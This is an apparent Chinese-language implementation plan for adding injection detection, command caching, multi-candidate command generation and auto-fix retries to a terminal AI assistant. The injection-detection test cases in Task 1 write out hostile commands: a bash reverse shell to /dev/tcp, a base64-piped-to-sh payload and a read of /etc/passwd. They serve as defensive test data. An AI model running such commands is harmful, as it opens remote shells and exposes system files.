# piz 功能迁移实施计划

**日期**: 2026-03-17
**关联分析**: [PIZ_MIGRATION_ANALYSIS_2026-03-17.md](../../Analysis/PIZ_MIGRATION_ANALYSIS_2026-03-17.md)
**状态**: ⏳ 待执行

---

## 1. 任务概述

将 [piz](https://github.com/AriesOxO/piz) 的核心特性迁移至 Tabby AI Assistant，包括命令缓存、多候选命令生成、注入检测增强和自动修复重试机制。

### 1.1 迁移范围

| 特性 | 优先级 | 预计工作量 | 收益评估 |
|------|-------|-----------|---------|
| 命令注入检测增强 | P0 | 0.5 天 | 提升安全性 |
| 命令缓存系统 | P1 | 1-2 天 | 降低 API 成本，加速响应 |
| 多候选命令生成 | P1 | 1 天 | 提升用户体验 |
| 自动修复重试机制 | P2 | 1 天 | 提高错误修复成功率 |

### 1.2 预期成果

- API 调用减少 30-50%（相同查询命中缓存）
- 命令响应时间从 2-5 秒降至 <100ms（缓存命中时）
- 安全检测覆盖命令注入、反向 shell 等攻击向量
- 用户可从 2-3 个候选命令中选择最佳方案

---

## 2. 任务分解

### Task 1: 命令注入检测增强

**状态**: ⏳ 待执行
**预计工作量**: 0.5 天
**优先级**: P0

#### 1.1 改动范围

| 文件 | 改动类型 | 说明 |
|-----|---------|------|
| `src/types/security.types.ts` | 修改 | 新增 InjectionPattern 类型 |
| `src/services/security/risk-assessment.service.ts` | 修改 | 添加注入检测规则 |

#### 1.2 实现步骤

1. **扩展类型定义** (`security.types.ts`)
```typescript
// 新增注入模式类型
export interface InjectionPattern {
    pattern: RegExp;
    description: string;
    severity: RiskLevel;
    category: 'command-substitution' | 'encoding-bypass' | 'remote-execution' | 'privilege-escalation';
}
```

2. **添加注入检测规则** (`risk-assessment.service.ts`)
   - 命令替换检测：`$()`、反引号
   - 编码绕过检测：base64、xxd 管道
   - 远程执行检测：curl/wget 管道
   - 反向 shell 检测：/dev/tcp、nc、socat
   - 环境变量注入检测

3. **扩展 performAssessment 方法**
   - 在现有危险模式检测后添加注入检测
   - 注入模式匹配直接提升至 HIGH/CRITICAL 级别
   - 添加详细的检测报告字段

#### 1.3 验收标准

- [ ] 新增 15+ 条注入检测规则
- [ ] 所有规则有对应的单元测试
- [ ] 现有测试不受影响
- [ ] 检测报告包含 category 字段

#### 1.4 测试用例

```typescript
describe('Injection Detection', () => {
    it('should detect command substitution', async () => {
        const result = await service.performAssessment('echo $(cat /etc/passwd)')
        expect(result.level).toBe(RiskLevel.HIGH)
        expect(result.patterns.some(p => p.category === 'command-substitution')).toBe(true)
    })

    it('should detect base64 bypass', async () => {
        const result = await service.performAssessment('echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh')
        expect(result.level).toBe(RiskLevel.CRITICAL)
    })

    it('should detect reverse shell', async () => {
        const result = await service.performAssessment('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
        expect(result.level).toBe(RiskLevel.CRITICAL)
    })
})
```

---

### Task 2: 命令缓存系统

**状态**: ⏳ 待执行
**预计工作量**: 1-2 天
**优先级**: P1
**依赖**: 无

#### 2.1 改动范围

| 文件 | 改动类型 | 说明 |
|-----|---------|------|
| `src/services/chat/command-cache.service.ts` | 新增 | 命令缓存服务 |
| `src/types/ai.types.ts` | 修改 | 扩展缓存相关类型 |
| `src/services/chat/command-generator.service.ts` | 修改 | 接入缓存逻辑 |
| `src/services/core/file-storage.service.ts` | 修改 | 支持缓存持久化 |
| `src/components/settings/data-settings.component.ts` | 修改 | 添加清除缓存 UI |
| `src/index.ts` | 修改 | 注册新 Provider |

#### 2.2 数据结构设计

```typescript
// 缓存条目类型
export interface CommandCacheEntry {
    id: string;
    naturalLanguage: string;    // 用户原始输入
    contextHash: string;        // 上下文指纹 (OS + shell + cwd hash)
    command: string;            // 生成的命令
    explanation: string;        // 命令说明
    confidence: number;         // 置信度
    alternatives?: AlternativeCommand[];  // 备选命令
    provider: string;           // LLM 提供商
    model: string;              // 模型名称
    createdAt: Date;            // 创建时间
    lastAccessedAt: Date;       // 最后访问时间
    hitCount: number;           // 命中次数
    ttl: number;                // 过期时间（秒）
    isExpired: boolean;         // 是否已过期
}

// 缓存配置
export interface CommandCacheConfig {
    enabled: boolean;
    maxSize: number;            // 最大条目数
    defaultTtl: number;         // 默认过期时间（秒）
    contextSimilarityThreshold: number;  // 上下文相似度阈值
}

// 默认配置
const DEFAULT_CACHE_CONFIG: CommandCacheConfig = {
    enabled: true,
    maxSize: 500,
    defaultTtl: 7 * 24 * 3600,  // 7 天
    contextSimilarityThreshold: 0.7,
}
```

#### 2.3 实现步骤

1. **创建 CommandCacheService**
   - 实现 `get()`, `set()`, `delete()`, `clear()` 方法
   - 实现 TTL 过期检查（定时任务，每分钟）
   - 实现 LRU 淘汰策略
   - 实现上下文 hash 计算

2. **实现缓存持久化**
   - 使用 FileStorageService 存储到本地
   - 启动时加载已有缓存
   - 支持导入/导出

3. **集成到 CommandGeneratorService**
   - 生成命令前先查缓存
   - 生成成功后写入缓存
   - 支持强制刷新（跳过缓存）

4. **添加设置界面**
   - 缓存开关
   - 清除缓存按钮
   - 缓存统计显示

#### 2.4 缓存键策略

```typescript
// 生成缓存键
generateCacheKey(naturalLanguage: string, context: TerminalContext): string {
    const contextFingerprint = this.hashContext({
        os: context.systemInfo.platform,
        shell: context.session.shell,
        // cwd 不参与 hash，因为相同命令在不同目录可能有相同语义
    })
    return `${naturalLanguage.toLowerCase().trim()}:${contextFingerprint}`
}

// 上下文 hash
private hashContext(ctx: { os: string; shell: string }): string {
    const str = JSON.stringify(ctx)
    // 使用简单的 hash 算法
    let hash = 0
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i)
        hash |= 0
    }
    return hash.toString(16)
}
```

#### 2.5 验收标准

- [ ] 缓存命中率统计功能正常
- [ ] TTL 过期自动清理正常
- [ ] LRU 淘汰在超过 maxSize 时触发
- [ ] 缓存持久化到本地，重启后恢复
- [ ] 设置界面可清除缓存
- [ ] 单元测试覆盖率 > 80%

#### 2.6 测试用例

```typescript
describe('CommandCacheService', () => {
    it('should cache and retrieve command', () => {
        const entry = createMockEntry()
        cache.set('key1', entry)
        expect(cache.get('key1')).toEqual(entry)
    })

    it('should respect TTL expiration', async () => {
        const entry = { ...createMockEntry(), ttl: 1 }
        cache.set('key1', entry)
        await sleep(1100)
        expect(cache.get('key1')).toBeNull()
    })

    it('should evict LRU entries when maxSize exceeded', () => {
        cache.setConfig({ maxSize: 2 })
        cache.set('key1', entry1)
        cache.set('key2', entry2)
        cache.set('key3', entry3)  // 应该淘汰 key1
        expect(cache.get('key1')).toBeNull()
        expect(cache.get('key2')).toBeDefined()
        expect(cache.get('key3')).toBeDefined()
    })

    it('should persist and restore cache', () => {
        cache.set('key1', entry1)
        cache.save()
        const newCache = new CommandCacheService(storage)
        expect(newCache.get('key1')).toEqual(entry1)
    })
})
```

---

### Task 3: 多候选命令生成

**状态**: ⏳ 待执行
**预计工作量**: 1 天
**优先级**: P1
**依赖**: Task 2（缓存需要存储多候选）

#### 3.1 改动范围

| 文件 | 改动类型 | 说明 |
|-----|---------|------|
| `src/types/ai.types.ts` | 修改 | 扩展 CommandResponse 类型 |
| `src/services/chat/command-generator.service.ts` | 修改 | 生成多候选 |
| `src/components/terminal/command-preview.component.ts` | 修改 | 显示多候选 UI |
| `src/components/terminal/command-suggestion.component.ts` | 修改 | 多候选选择交互 |

#### 3.2 类型扩展

```typescript
// 扩展 CommandResponse
export interface CommandResponse {
    command: string;              // 主推荐命令
    alternatives?: AlternativeCommand[];  // 替代方案 (0-3 个)
    explanation: string;
    confidence: number;
    fromCache?: boolean;          // 是否来自缓存
}

// 替代命令类型
export interface AlternativeCommand {
    command: string;
    explanation: string;
    confidence: number;
    tags?: ('safer' | 'faster' | 'more-verbose' | 'simpler')[];
}
```

#### 3.3 Prompt 优化

```typescript
// 更新命令生成 prompt
private getMultiCandidatePrompt(): string {
    return `You are a command generation assistant. Given the user's natural language request, generate the best command and up to 2 alternative approaches.

Response format (JSON):
{
    "command": "primary recommended command",
    "explanation": "brief explanation of what this command does",
    "confidence": 0.95,
    "alternatives": [
        {
            "command": "alternative command 1",
            "explanation": "why this is an alternative",
            "confidence": 0.85,
            "tags": ["safer"]
        }
    ]
}

Guidelines:
- Primary command should be the most commonly used approach
- Alternatives should offer different trade-offs (safer, faster, more verbose, etc.)
- Only provide alternatives when there are genuinely different approaches
- Do NOT provide alternatives for simple commands (ls, cd, etc.)`
}
```

#### 3.4 UI 设计

```
┌─────────────────────────────────────────────────────────┐
│ 🤖 AI 建议命令                                           │
│                                                         │
│ ✅ find . -size +100M -type f                          │
│    查找当前目录下所有大于 100MB 的文件                    │
│    置信度: 95%                                          │
│                                                         │
│ 📋 备选命令:                                            │
│    [1] du -ah . | sort -rh | head -n 20                │
│        显示目录大小并排序                                │
│        标签: more-verbose                               │
│                                                         │
│    [2] find . -type f -exec du -h {} \; | sort -rh    │
│        使用 du 计算每个文件大小                          │
│        标签: slower, more-accurate                      │
│                                                         │
│ [Enter] 执行主命令  [1/2] 执行备选  [E] 编辑  [C] 取消  │
└─────────────────────────────────────────────────────────┘
```

#### 3.5 验收标准

- [ ] LLM 返回 1-3 个候选命令
- [ ] UI 正确显示所有候选
- [ ] 用户可通过快捷键选择不同候选
- [ ] 缓存正确存储和恢复多候选

---

### Task 4: 自动修复重试机制

**状态**: ⏳ 待执行
**预计工作量**: 1 天
**优先级**: P2
**依赖**: 无

#### 4.1 改动范围

| 文件 | 改动类型 | 说明 |
|-----|---------|------|
| `src/types/terminal.types.ts` | 修改 | 新增 FixAttempt 类型 |
| `src/services/chat/command-generator.service.ts` | 修改 | 实现重试逻辑 |

#### 4.2 类型定义

```typescript
// 修复尝试记录
export interface FixAttempt {
    attempt: number;            // 尝试次数
    command: string;            // 尝试的命令
    error: string;              // 错误信息
    timestamp: Date;            // 时间戳
}

// 修复选项
export interface FixOptions {
    maxRetries: number;         // 最大重试次数，默认 3
    autoExecute: boolean;       // 是否自动执行，默认 false
    includeHistory: boolean;    // 是否包含历史尝试信息
}
```

#### 4.3 实现步骤

1. **扩展 generateFixForError 方法**
```typescript
async generateFixForError(
    error: TerminalError,
    options: FixOptions = { maxRetries: 3, autoExecute: false, includeHistory: true }
): Promise<CommandResponse> {
    const attempts: FixAttempt[] = []

    for (let i = 0; i < options.maxRetries; i++) {
        const fix = await this.generateCommand({
            naturalLanguage: this.buildFixPrompt(error, attempts),
            context: this.buildErrorContext(error),
        })

        if (!options.autoExecute) {
            return { ...fix, attempts }
        }

        // 自动执行模式
        const result = await this.executeAndValidate(fix.command)
        attempts.push({
            attempt: i + 1,
            command: fix.command,
            error: error.message,
            timestamp: new Date(),
        })

        if (result.success) {
            return { ...fix, attempts, success: true }
        }

        error = result.error  // 更新错误用于下次重试
    }

    throw new Error(`Failed to fix after ${options.maxRetries} attempts`)
}

private buildFixPrompt(error: TerminalError, attempts: FixAttempt[]): string {
    let prompt = `Fix this terminal error:\n${error.message}\n\nFailed command: ${error.command}`

    if (attempts.length > 0) {
        prompt += '\n\nPrevious fix attempts that failed:'
        attempts.forEach(a => {
            prompt += `\n- Attempt ${a.attempt}: ${a.command}\n  Error: ${a.error}`
        })
        prompt += '\n\nPlease try a different approach.'
    }

    return prompt
}
```

#### 4.4 验收标准

- [ ] 支持配置最大重试次数
- [ ] 每次重试携带历史尝试信息
- [ ] 返回值包含所有尝试记录
- [ ] 单元测试覆盖边界情况

---

### Task 5: 集成测试

**状态**: ⏳ 待执行
**预计工作量**: 0.5 天
**优先级**: P1
**依赖**: Task 1-4 全部完成

#### 5.1 测试场景

1. **端到端命令生成流程**
   - 自然语言输入 → 缓存未命中 → LLM 调用 → 多候选返回 → 缓存存储
   - 相同输入 → 缓存命中 → 直接返回

2. **安全检测流程**
   - 输入危险命令 → 注入检测 → 阻止执行
   - 输入正常命令 → 通过检测 → 执行

3. **错误修复流程**
   - 命令失败 → 生成修复 → 执行 → 成功/失败 → 重试

#### 5.2 验收标准

- [ ] 所有 E2E 测试通过
- [ ] 无内存泄漏
- [ ] 性能指标达标（缓存命中 <100ms）

---

## 3. 文件变更清单

### 新增文件

| 文件路径 | 说明 |
|---------|------|
| `src/services/chat/command-cache.service.ts` | 命令缓存服务 |
| `src/services/chat/command-cache.service.spec.ts` | 缓存服务测试 |

### 修改文件

| 文件路径 | 改动说明 |
|---------|----------|
| `src/types/ai.types.ts` | 扩展 CommandResponse、AlternativeCommand |
| `src/types/security.types.ts` | 扩展 InjectionPattern 类型 |
| `src/types/terminal.types.ts` | 扩展 FixAttempt、FixOptions |
| `src/services/security/risk-assessment.service.ts` | 新增注入检测规则 |
| `src/services/chat/command-generator.service.ts` | 接入缓存 + 多候选 + 重试 |
| `src/services/core/file-storage.service.ts` | 支持缓存存储 |
| `src/components/terminal/command-preview.component.ts` | 多候选 UI |
| `src/components/terminal/command-suggestion.component.ts` | 多候选选择 |
| `src/components/settings/data-settings.component.ts` | 清除缓存入口 |
| `src/index.ts` | 注册新 Provider |

---

## 4. 风险与缓解措施

| 风险 | 可能性 | 影响 | 缓解措施 |
|-----|--------|------|----------|
| 缓存返回过时命令 | 中 | 中 | 7天 TTL + 用户可手动清除缓存 |
| 多候选增加响应延迟 | 低 | 低 | 一次请求返回，不增加 API 调用 |
| 注入检测误报正常命令 | 低 | 中 | 保留白名单机制，用户可覆盖 |
| 重试循环执行危险命令 | 中 | 高 | 每次重试均经过完整安全验证 |
| Angular DI 循环依赖 | 低 | 高 | CommandCacheService 不依赖 CommandGeneratorService |

---

## 5. 回滚方案

每个 Task 独立提交，出现问题可按 Task 粒度回滚：

```bash
git revert <commit-hash>
```

缓存功能可通过配置开关快速禁用：

```typescript
// 在 ai-config.provider.ts 中
commandCache: {
    enabled: false  // 禁用缓存
}
```

---

## 6. 执行状态追踪

| Task | 状态 | 开始时间 | 完成时间 | Commit |
|------|------|---------|---------|--------|
| Task 1: 注入检测增强 | ⏳ 待执行 | - | - | - |
| Task 2: 命令缓存系统 | ⏳ 待执行 | - | - | - |
| Task 3: 多候选命令生成 | ⏳ 待执行 | - | - | - |
| Task 4: 自动修复重试 | ⏳ 待执行 | - | - | - |
| Task 5: 集成测试 | ⏳ 待执行 | - | - | - |